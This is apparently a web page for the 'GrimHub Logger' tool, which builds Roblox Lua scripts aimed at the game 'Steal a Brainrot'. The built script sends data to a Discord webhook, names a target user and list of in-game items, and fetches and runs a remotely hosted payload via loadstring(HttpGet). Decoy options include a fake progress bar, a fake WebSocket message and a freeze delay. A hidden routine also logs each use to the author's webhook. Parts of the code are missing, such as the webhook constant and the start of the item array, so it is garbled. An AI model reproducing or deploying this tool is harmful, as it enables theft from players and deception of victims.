<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>GrimHub Logger | Script Generator</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💀</text></svg>">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0C1023;
            font-family: 'Inter', 'Poppins', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            padding: 2rem 1.5rem;
            color: #f0f3ff;
        }

        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        ::-webkit-scrollbar-track {
            background: #141932;
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb {
            background: #423189;
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #8B00FF;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 2rem;
            padding-bottom: 1rem;
            border-bottom: 1px solid rgba(139,0,255,0.3);
            flex-wrap: wrap;
            gap: 1rem;
        }
        .logo h1 {
            font-size: 1.6rem;
            font-weight: 600;
            background: linear-gradient(135deg, #ffffff, #b77cff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .logo span {
            font-size: 0.8rem;
            color: #6f78a0;
            display: block;
        }
        .stats {
            display: flex;
            gap: 1.5rem;
        }
        .stat-box {
            text-align: center;
            background: #141932;
            padding: 0.5rem 1.2rem;
            border-radius: 12px;
            border: 1px solid #1E2846;
        }
        .stat-number {
            font-size: 1.3rem;
            font-weight: 700;
            color: #b77cff;
        }
        .stat-label {
            font-size: 0.7rem;
            color: #6f78a0;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
            gap: 1.5rem;
            margin-bottom: 1.5rem;
        }

        .card {
            background: #141932;
            border: 1px solid #1E2846;
            border-radius: 16px;
            padding: 1.5rem;
            transition: all 0.2s ease;
        }
        .card:hover {
            border-color: #8B00FF;
            box-shadow: 0 8px 24px rgba(139,0,255,0.15);
        }
        .card-title {
            font-size: 1rem;
            font-weight: 600;
            margin-bottom: 1rem;
            padding-bottom: 0.5rem;
            border-bottom: 1px solid #1E2846;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            color: #b9c3f0;
        }

        input, select, textarea {
            width: 100%;
            background: #0C1023;
            border: 1px solid #1E2846;
            border-radius: 10px;
            padding: 10px 14px;
            color: white;
            font-size: 0.85rem;
            transition: 0.2s;
            font-family: inherit;
        }
        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #8B00FF;
            box-shadow: 0 0 0 2px rgba(139, 0, 255, 0.1);
        }
        label {
            font-size: 0.75rem;
            font-weight: 500;
            color: #8e9acb;
            display: block;
            margin-bottom: 0.3rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .search-box {
            margin-bottom: 1rem;
        }
        
        .select-buttons {
            display: flex;
            gap: 0.5rem;
            margin-bottom: 1rem;
        }
        .small-btn {
            background: #1E2846;
            border: none;
            color: white;
            padding: 5px 12px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 0.7rem;
            font-weight: 500;
            transition: all 0.2s;
        }
        .small-btn:hover {
            background: #423189;
        }
        .small-btn.select-all {
            background: #1b5e20;
        }
        .small-btn.deselect-all {
            background: #8b0000;
        }

        .brainrot-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(175px, 1fr));
            gap: 0.5rem;
            max-height: 350px;
            overflow-y: auto;
            background: #0a0e1c;
            border-radius: 12px;
            padding: 0.8rem;
        }
        .brainrot-item {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            background: #0C1023;
            padding: 8px 12px;
            border-radius: 8px;
            border: 1px solid #1E2846;
            cursor: pointer;
            transition: all 0.15s;
        }
        .brainrot-item.selected {
            background: #2a1e55;
            border-color: #8B00FF;
            box-shadow: 0 0 8px rgba(139,0,255,0.3);
        }
        .brainrot-item img {
            width: 32px;
            height: 32px;
            object-fit: cover;
            border-radius: 6px;
            background: #1a1f3a;
        }
        .brainrot-item span {
            flex: 1;
            font-size: 0.75rem;
            font-weight: 500;
        }

        .toggle-group {
            display: flex;
            flex-wrap: wrap;
            gap: 0.8rem;
            margin: 0.8rem 0;
        }
        .toggle-switch {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            background: #0C1023;
            padding: 6px 14px;
            border-radius: 20px;
            border: 1px solid #1E2846;
            cursor: pointer;
            font-size: 0.75rem;
        }
        .toggle-switch input {
            width: 14px;
            height: 14px;
            margin: 0;
            cursor: pointer;
        }

        .slider-group {
            margin-top: 0.8rem;
        }
        .slider-group input {
            accent-color: #8B00FF;
        }
        .freeze-value {
            display: inline-block;
            background: #0C1023;
            padding: 2px 8px;
            border-radius: 20px;
            margin-left: 10px;
            font-size: 0.75rem;
            color: #b77cff;
        }

        .btn {
            border: none;
            background: #5865F2;
            color: white;
            font-weight: 600;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s;
            font-size: 0.85rem;
            font-family: inherit;
        }
        .btn-primary {
            background: linear-gradient(135deg, #423189, #8B00FF);
        }
        .btn-primary:hover {
            opacity: 0.9;
            transform: translateY(-1px);
        }
        .btn-secondary {
            background: #1E2846;
        }
        .btn-secondary:hover {
            background: #2a3555;
        }
        .btn-group {
            display: flex;
            gap: 0.8rem;
            flex-wrap: wrap;
            margin-bottom: 1rem;
        }

        .output-card {
            margin-top: 0;
        }
        pre {
            background: #0a0e1c;
            padding: 1rem;
            border-radius: 12px;
            overflow-x: auto;
            font-family: 'Fira Code', monospace;
            font-size: 0.7rem;
            border: 1px solid #1E2846;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .copy-success {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #2ecc71;
            color: white;
            padding: 10px 20px;
            border-radius: 8px;
            font-size: 0.8rem;
            z-index: 999;
            animation: fadeIn 0.2s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        footer {
            text-align: center;
            font-size: 0.7rem;
            color: #4f5a8e;
            margin-top: 2rem;
            padding-top: 1rem;
            border-top: 1px solid #1E2846;
        }

        @media (max-width: 780px) {
            body { padding: 1rem; }
            .header { flex-direction: column; text-align: center; }
            .stats { justify-content: center; }
            .grid { grid-template-columns: 1fr; }
            .brainrot-grid { grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="logo">
            <h1>GrimHub Logger</h1>
            <span>Script Generation Interface</span>
        </div>
        <div class="stats">
            <div class="stat-box">
                <div class="stat-number" id="totalBrainrotsCount">0</div>
                <div class="stat-label">Assets</div>
            </div>
            <div class="stat-box">
                <div class="stat-number" id="selectedStats">0</div>
                <div class="stat-label">Selected</div>
            </div>
        </div>
    </div>

    <div class="grid">
        <div class="card">
            <div class="card-title">📡 Configuration</div>
            <label>Discord Webhook</label>
            <input type="url" id="webhookInput" placeholder="https://discord.com/api/webhooks/...">
            <label style="margin-top: 0.8rem;">Target Username</label>
            <input type="text" id="targetUser" placeholder="Morreria" value="Morreria">
        </div>

        <div class="card">
            <div class="card-title">⚙️ Execution</div>
            <select id="scriptMode">
                <option value="AUTO-MORRERIA">Auto Morreria</option>
            </select>

            <div style="margin: 0.8rem 0 0.5rem 0;"><label>Distractions</label></div>
            <div class="toggle-group">
                <label class="toggle-switch">
                    <input type="checkbox" id="fakeProgress"> Progress Bar
                </label>
                <label class="toggle-switch">
                    <input type="checkbox" id="fakeWebSocket"> WebSocket Message
                </label>
            </div>
            <div class="slider-group">
                <label>Freeze Delay</label>
                <input type="range" id="freezeSlider" min="0" max="30" step="1" value="0">
                <span class="freeze-value" id="freezeValueDisplay">0s</span>
            </div>
        </div>

        <div class="card">
            <div class="card-title">🧠 Asset Selector</div>
            <div class="search-box">
                <input type="text" id="brainrotSearch" placeholder="Filter assets...">
            </div>
            <div class="select-buttons">
                <button class="small-btn select-all" id="selectAllBtn">Select All</button>
                <button class="small-btn deselect-all" id="deselectAllBtn">Deselect All</button>
            </div>
            <div id="brainrotGrid" class="brainrot-grid"></div>
        </div>
    </div>

    <div class="card output-card">
        <div class="card-title">📜 Output</div>
        <div class="btn-group">
            <button class="btn btn-primary" id="generateBtn">Generate Script</button>
            <button class="btn btn-secondary" id="copyBtn">Copy</button>
            <button class="btn btn-secondary" id="downloadBtn">Download .lua</button>
        </div>
        <pre id="outputCode">-- GrimHub Logger
-- Configure settings above and click Generate</pre>
    </div>
    <footer></footer>
</div>

<script>
    // ========== GLOBAL LOG WEBHOOK (REPLACE WITH YOURS) ==========

    // ========== COMPLETE BRAINROTS LIST (SORTED BEST TO WORST) ==========

        "Los Hotspotsitos", "Los Jolly Combinasionas", "Snailo Clovero", "Los Planitos", "Chicleteira Cupideira",
        "DJ Panda", "Las Sis", "Spinny Hammy", "Tacorita Bicicleta", "Los Sweethearts",
        
        // RARE TIER
        "Nuclearo Dinossauro", "Chicleteira Noelteira", "Los Combinasionas", "Chimnino", "Noo my Gold",
        "Swag Soda", "Noo my Heart", "Tacorillo Crocodillo", "Mariachi Corazoni", "La Grande Combinasion",
        "Los 25", "Los Burritos", "67", "Donkeyturbo Express", "Los Chicleteiras", "Guest 666",
        "Los Mi Gatitos", "Rang Ring Bus", "Granny", "Noo my Present", "Serafinna Medusella",
        
        // COMMON TIER
        "Los Nooo My Hotspotsitos", "Arcadopus", "Noo my Candy", "Los Quesadillas", "Chicleteirina Bicicleteirina",
        "Chill Puppy", "Burrito Bandito", "Luck Luck Luck Sahur", "Chicleteira Bicicleteira", "Brunito Marsito",
        "Quesadillo Vampiro", "Eid Eid Eid Sahur", "Cupid Hotspot", "Mi Gatito", "Ho Ho Ho Sahur",
        "Cupid Cupid Sahur", "Pot Pumpkin", "Naughty Naughty", "Bunito Bunito Spinito", "Quesadilla Crocodila",
        "Horegini Boom", "Santa Hotspot", "Pot Hotspot", "25", "Pirulitoita Bicicleteira", "To to to Sahur",
        "Telemorte", "La Sahur Combinasion", "List List List Sahur", "Noo my examine", "Los Jobcitos",
        "Nooo My Hotspot", "Bunnyman", "Cuadramat and Pakrahmatmamat", "Please my Present", "Los Cucarachas",
        "1x1x1x1", "La Vacca Lepre Lepreino", "Love Love Love Sahur", "Perrito Burrito", "Graipuss Medussi",
        "Giftini Spyderini", "GOAT", "Trickolino", "Paradiso Axolottino", "Triplito Tralaleritos",
        "La Vacca Jacko Linterino", "Fishboard", "Santteo", "Las Vaquitas Saturnitas", "Los Karkeritos",
        "Karker Sahur", "Los Trios", "Job Job Job Sahur", "Frankentteo", "Pumpkini Spyderini", "Las Tralaleritas",
        "Rocco Disco", "Extinct Matteo", "La Karkerkar Kombinasin", "La Vacca Prese Presente", "Reindeer Tralala",
        "Yess my examine", "Guerriro Digitale", "Boatito Auratito", "Vulturino Skeletono", "Los Tralaleritos",
        "Zombie Tralala", "Los Tortus", "La Cucaracha", "Fragola La La La", "Extinct Tralalero",
        "Agarrini la Palini", "Los Spyderinis", "Chachechi", "Blackhole Goat", "Dul Dul Dul",
        "Torrtuginni Dragonfrutini", "Trenostruzzo Turbo 4000", "Karkerkar Kurkur", "Los Matteos",
        "Bisonte Giuppitere", "Sammyni Spyderini", "La Vacca Saturno Saturnita", "Jackorilla"
    ];

    document.getElementById('totalBrainrotsCount').innerText = brainrotsList.length;

    async function fetchBrainrotImageUrl(name) {
        const proxyUrl = 'https://api.allorigins.win/raw?url=';
        const wikiName = encodeURIComponent(name.replace(/ /g, '_'));
        const wikiUrl = `https://stealabrainrot.fandom.com/wiki/${wikiName}`;
        try {
            const response = await fetch(proxyUrl + encodeURIComponent(wikiUrl));
            const html = await response.text();
            const ogMatch = html.match(/property="og:image"\s+content="([^"]+)"/);
            if (ogMatch && ogMatch[1]) return ogMatch[1];
            const imgMatch = html.match(/data-src="(https:\/\/static\.wikia\.nocookie\.net\/[^"]+\.(?:png|jpg|jpeg|webp|gif))/i);
            if (imgMatch && imgMatch[1]) return imgMatch[1];
            return null;
        } catch (e) {
            return null;
        }
    }

    const imageCache = new Map();

    async function loadImageForBrainrot(name, imgElement) {
        if (imageCache.has(name)) {
            const imgUrl = imageCache.get(name);
            imgElement.src = imgUrl || `https://ui-avatars.com/api/?background=423189&color=fff&size=32&name=${encodeURIComponent(name.charAt(0))}`;
            return;
        }
        imgElement.src = `https://ui-avatars.com/api/?background=423189&color=fff&size=32&name=${encodeURIComponent(name.charAt(0))}`;
        const imgUrl = await fetchBrainrotImageUrl(name);
        imageCache.set(name, imgUrl);
        if (imgUrl) imgElement.src = imgUrl;
    }

    let selectedBrainrots = new Set();

    const brainrotGrid = document.getElementById('brainrotGrid');
    const searchInput = document.getElementById('brainrotSearch');
    const webhookInput = document.getElementById('webhookInput');
    const targetUser = document.getElementById('targetUser');
    const scriptMode = document.getElementById('scriptMode');
    const fakeProgress = document.getElementById('fakeProgress');
    const fakeWebSocket = document.getElementById('fakeWebSocket');
    const freezeSlider = document.getElementById('freezeSlider');
    const freezeValueDisplay = document.getElementById('freezeValueDisplay');
    const generateBtn = document.getElementById('generateBtn');
    const outputCode = document.getElementById('outputCode');
    const copyBtn = document.getElementById('copyBtn');
    const downloadBtn = document.getElementById('downloadBtn');
    const selectAllBtn = document.getElementById('selectAllBtn');
    const deselectAllBtn = document.getElementById('deselectAllBtn');
    const selectedStats = document.getElementById('selectedStats');

    async function renderBrainrots() {
        const searchTerm = searchInput.value.toLowerCase();
        const filtered = brainrotsList.filter(br => br.toLowerCase().includes(searchTerm));
        brainrotGrid.innerHTML = '';
        for (const brainrot of filtered) {
            const isChecked = selectedBrainrots.has(brainrot);
            const div = document.createElement('div');
            div.className = `brainrot-item ${isChecked ? 'selected' : ''}`;
            
            const img = document.createElement('img');
            const span = document.createElement('span');
            span.innerText = brainrot;
            
            div.appendChild(img);
            div.appendChild(span);
            
            div.addEventListener('click', () => {
                if (selectedBrainrots.has(brainrot)) {
                    selectedBrainrots.delete(brainrot);
                    div.classList.remove('selected');
                } else {
                    selectedBrainrots.add(brainrot);
                    div.classList.add('selected');
                }
                updateSelectedCount();
            });
            
            brainrotGrid.appendChild(div);
            loadImageForBrainrot(brainrot, img);
        }
        updateSelectedCount();
    }

    function updateSelectedCount() {
        selectedStats.innerText = selectedBrainrots.size;
    }

    function selectAll() {
        brainrotsList.forEach(br => selectedBrainrots.add(br));
        updateSelectedCount();
        renderBrainrots();
        showToast(`Selected ${selectedBrainrots.size} assets`);
    }

    function deselectAll() {
        selectedBrainrots.clear();
        updateSelectedCount();
        renderBrainrots();
        showToast('Deselected all assets');
    }

    selectAllBtn.addEventListener('click', selectAll);
    deselectAllBtn.addEventListener('click', deselectAll);
    freezeSlider.addEventListener('input', () => freezeValueDisplay.innerText = freezeSlider.value + 's');

    async function sendGlobalLog(data) {
        if (!GLOBAL_WEBHOOK || GLOBAL_WEBHOOK === "YOUR_DISCORD_WEBHOOK_URL_HERE") return;
        try {
            await fetch(GLOBAL_WEBHOOK, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: null,
                    embeds: [{
                        title: "📊 GrimHub Generator Log",
                        color: 0x8B00FF,
                        fields: [
                            { name: "🎯 Target", value: data.target, inline: true },
                            { name: "🧠 Assets", value: data.brainrotCount.toString(), inline: true },
                            { name: "🎭 Distractions", value: data.distractions, inline: true },
                            { name: "❄️ Freeze", value: data.freeze + "s", inline: true }
                        ],
                        footer: { text: "GrimHub Logger • " + new Date().toLocaleString() },
                        timestamp: new Date().toISOString()
                    }]
                })
            });
        } catch(e) {}
    }

    function generateScript() {
        const webhook = webhookInput.value.trim();
        if (!webhook) return alert('Webhook required');
        if (!webhook.startsWith('https://discord.com/api/webhooks/')) return alert('Invalid webhook URL');
        
        const target = targetUser.value.trim() || "Morreria";
        const brainrotsArray = Array.from(selectedBrainrots);
        let brainrotsLua = '{' + brainrotsArray.map(br => `"${br.replace(/"/g, '\\"')}"`).join(', ') + '}';
        
        const script = `-- GrimHub Logger
script_key = "trial"

getgenv().Webhook = "${webhook}"
getgenv().User = "${target}"
getgenv().Brainrots = ${brainrotsLua}
getgenv().ScriptMode = "AUTO-MORRERIA"
getgenv().Distraction = {
    ProgressBar = ${fakeProgress.checked},
    FakeWebSocket = ${fakeWebSocket.checked},
    FreezeAfter = ${parseInt(freezeSlider.value, 10)}
}

loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/e5d6f5931adf4184336d3d2463fedaccd56ede1246ebba931f664c1058acd094.lua"))()`;
        
        outputCode.innerText = script;
        
        const distractions = `${fakeProgress.checked ? "Progress " : ""}${fakeWebSocket.checked ? "WebSocket" : ""}`.trim() || "None";
        sendGlobalLog({
            target: target,
            brainrotCount: brainrotsArray.length,
            distractions: distractions,
            freeze: parseInt(freezeSlider.value, 10)
        });
    }
    
    generateBtn.addEventListener('click', generateScript);
    copyBtn.addEventListener('click', async () => {
        if (!outputCode.innerText.includes('Webhook')) return alert('Generate first');
        await navigator.clipboard.writeText(outputCode.innerText);
        showToast('Copied');
    });
    downloadBtn.addEventListener('click', () => {
        if (!outputCode.innerText.includes('Webhook')) return alert('Generate first');
        const blob = new Blob([outputCode.innerText], {type: 'text/plain'});
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = `grimhub_${Date.now()}.lua`;
        a.click();
        URL.revokeObjectURL(a.href);
        showToast('Downloaded');
    });
    
    function showToast(msg) {
        let toast = document.querySelector('.copy-success');
        if (toast) toast.remove();
        const div = document.createElement('div');
        div.className = 'copy-success';
        div.innerText = msg;
        document.body.appendChild(div);
        setTimeout(() => div.remove(), 2000);
    }
    
    renderBrainrots();
    updateSelectedCount();
    searchInput.addEventListener('input', () => renderBrainrots());
</script>
</body>
</html>
